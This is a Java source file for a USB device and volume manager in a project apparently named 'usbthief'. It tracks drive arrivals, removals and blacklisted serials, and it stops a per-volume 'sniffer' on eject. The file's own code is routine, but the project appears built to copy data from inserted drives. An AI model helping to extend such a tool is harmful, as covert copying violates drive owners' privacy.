package com.superredrock.usbthief.core;

import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.device.DeviceArrivalEvent;
import com.superredrock.usbthief.core.event.device.DeviceRemovalEvent;
import com.superredrock.usbthief.core.event.device.NewDeviceJoinedEvent;
import com.superredrock.usbthief.core.event.device.VolumeInsertedEvent;
import com.superredrock.usbthief.core.event.device.VolumeRemovedEvent;
import com.superredrock.usbthief.core.event.device.VolumeStateChangedEvent;
import com.superredrock.usbthief.worker.SnifferLifecycleManager;

import java.nio.file.Path;
import java.util.Collection;
import java.util.Collections;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * USB device and volume management service.
 * <p>
 * Tracks Device (hardware info) and Volume (drive/operational) independently.
 * Device = pure info board (VID/PID/serial), Volume = operational entity (state/copy).
 * No parent-child relationship between them.
 */
public class DeviceManager extends Service implements UsbHotplugMonitor.VolumeListener, UsbHotplugMonitor.DeviceListener {

    private static final Logger logger = LogManager.getLogger(DeviceManager.class);

    private static volatile DeviceManager INSTANCE;

    private final UsbHotplugMonitor monitor = new UsbHotplugMonitor();

    // Independent maps — no cross-referencing
    private final ConcurrentHashMap<String, Device> devicesMap = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, Volume> volumesMap = new ConcurrentHashMap<>();

    private Device lastAddDevice = null;

    private DeviceManager() {
        monitor.setVolumeListener(this);
        monitor.setDeviceListener(this);
    }

    public static DeviceManager getInstance() {
        if (INSTANCE == null) {
            synchronized (DeviceManager.class) {
                if (INSTANCE == null) {
                    INSTANCE = new DeviceManager();
                }
            }
        }
        return INSTANCE;
    }

    @Override
    public void start() {
        super.start();
        if (!monitor.isRunning()) {
            try {
                monitor.start();
                logger.info("UsbHotplugMonitor started successfully");
            } catch (Exception e) {
                logger.error("Failed to start UsbHotplugMonitor:", e);
            }
        }
    }

    @Override
    protected void tick() {
        volumesMap.forEach((_, volume) -> {
            Volume.VolumeState oldState = volume.getState();
            volume.updateState();
            if (volume.isChangeAndReset()) {
                logger.debug("Volume {} state changed: {} -> {}", volume.getSerialNumber(), oldState, volume.getState());
                EventBus.getInstance().dispatch(new VolumeStateChangedEvent(volume, oldState, volume.getState()));
            }
        });
    }

    // ========== Device queries ==========

    public Collection<Device> getAllDevices() {
        return Collections.unmodifiableCollection(devicesMap.values());
    }

    public Device getDeviceBySerial(String serial) {
        return devicesMap.get(serial);
    }

    // ========== Volume queries ==========

    public Collection<Volume> getAllVolumes() {
        return Collections.unmodifiableCollection(volumesMap.values());
    }

    public Volume getVolume(Path path) {
        return volumesMap.search(1, (_, volume) ->
                path.startsWith(volume.getRootPath()) ? volume : null);
    }

    public Volume getVolumeBySerial(String serial) {
        return volumesMap.get(serial);
    }

    public Volume getVolumeByDriveLetter(String driveLetter) {
        return volumesMap.search(1, (_, v) ->
                driveLetter.equals(v.getDriveLetter()) ? v : null);
    }

    // ========== Volume operations ==========

    public void enable(Volume volume) {
        if (volume != null) {
            volume.enable();
            logger.info("Volume enabled: {}", volume.getSerialNumber());
        }
    }

    public void disable(Volume volume) {
        if (volume != null) {
            volume.disable();
            logger.info("Volume disabled: {}", volume.getSerialNumber());
        }
    }

    public void remove(Volume volume) {
        if (volume != null) {
            volumesMap.remove(volume.getSerialNumber());
        }
    }



    // ========== Service lifecycle ==========

    @Override
    protected long getTickInterval() {
        return 1;
    }

    @Override
    protected TimeUnit getTickUnit() {
        return TimeUnit.SECONDS;
    }

    @Override
    public String getServiceName() {
        return "DeviceManager";
    }

    @Override
    public String getDescription() {
        return "USB device and volume management service";
    }

    // ========== DeviceListener — hardware device events ==========

    @Override
    public void onDeviceArrival(String dbccName) {
        logger.info("Device interface arrived: {}", dbccName);

        DeviceUtils.DeviceIdentity identity = DeviceUtils.parseDeviceInstancePath(dbccName);
        if (identity == null) {
            logger.warn("Could not parse device instance path: {}", dbccName);
            return;
        }

        String serial = identity.serial();
        if (serial == null || serial.isEmpty()) {
            logger.warn("No serial number in device path: {}", dbccName);
            return;
        }

        if (ConfigManager.getInstance().isDeviceBlacklistedBySerial(serial)) {
            logger.debug("Ignoring blacklisted device: {}", serial);
            return;
        }
        // Register Device (pure info board) — independent of Volume
        Device device = devicesMap.computeIfAbsent(serial, _ -> {
            Device d = new Device(serial, identity.vid(), identity.pid(), dbccName);
            logger.info("New device registered: {} (VID:{}, PID:{})", serial, identity.vid(), identity.pid());
            EventBus.getInstance().dispatch(new NewDeviceJoinedEvent(d));
            return d;
        });
        lastAddDevice = device;
        EventBus.getInstance().dispatch(new DeviceArrivalEvent(device));
    }

    @Override
    public void onDeviceRemoval(String dbccName) {
        logger.info("Device interface removed: {}", dbccName);

        DeviceUtils.DeviceIdentity identity = DeviceUtils.parseDeviceInstancePath(dbccName);
        if (identity == null) {
            logger.warn("Could not parse device instance path: {}", dbccName);
            return;
        }

        String serial = identity.serial();
        if (serial == null || serial.isEmpty()) {
            return;
        }

        Device device = devicesMap.get(serial);
        if (device != null) {
            EventBus.getInstance().dispatch(new DeviceRemovalEvent(device));
            // Keep device info (it may reconnect later)
        }
    }

    // ========== VolumeListener — drive letter events ==========

    @Override
    public void onVolumeArrival(String driveLetter) {
        logger.info("Volume arrived: {}", driveLetter);
        Path rootPath = Path.of(driveLetter + "\\\\");
        String serial;
        serial = DeviceUtils.getVolumeSN(driveLetter);
        if (ConfigManager.getInstance().isDeviceBlacklistedBySerial(serial)) {
            logger.debug("Ignoring blacklisted volume: {}", serial);
            return;
        }


        Volume newVolume = new Volume(rootPath, serial);
        newVolume.updateState();
        newVolume.isChangeAndReset(); // consume flag to prevent spurious tick()

        Volume existing = volumesMap.putIfAbsent(serial, newVolume);
        Volume volume = existing != null ? existing : newVolume;

        if (existing == null) {
            logger.info("New volume registered: {} at {}", serial, rootPath);
        }

        volume.setState(Volume.VolumeState.IDLE);

        // Bidirectional link
        if (lastAddDevice != null) {
            volume.setDevice(lastAddDevice);
            lastAddDevice.addVolume(volume);
        }

        EventBus.getInstance().dispatch(new VolumeInsertedEvent(volume));

        monitor.registerVolumeHandle(driveLetter);
    }

    @Override
    public void onVolumeRemoval(String driveLetter) {
        logger.info("Volume removed: {}", driveLetter);

        monitor.unregisterVolumeHandle(driveLetter);

        Volume volume = volumesMap.search(1, (_, v) ->
                driveLetter.equals(v.getDriveLetter()) ? v : null);
        if (volume != null) {
            volume.setState(Volume.VolumeState.OFFLINE);
            logger.info("Volume marked OFFLINE: {} ({})", driveLetter, volume.getSerialNumber());
            EventBus.getInstance().dispatch(new VolumeRemovedEvent(volume));
        }
    }

    @Override
    public boolean onVolumeQueryRemove(String driveLetter) {
        Volume volume = getVolumeByDriveLetter(driveLetter);
        if (volume == null) {
            return true;
        }

        String serial = volume.getSerialNumber();
        volume.setEjecting();
        logger.info("Volume ejecting: {} ({})", driveLetter, serial);

        try {
            SnifferLifecycleManager.getInstance().stop(serial);
        } catch (Exception e) {
            logger.warn("Error during eject cleanup for {}: {}", serial, e.getMessage());
        }
        lastAddDevice = null;
        return true;
    }

    @Override
    protected void cleanup() {
        if (monitor.isRunning()) {
            monitor.stop();
            logger.info("UsbHotplugMonitor stopped");
        }
    }
}
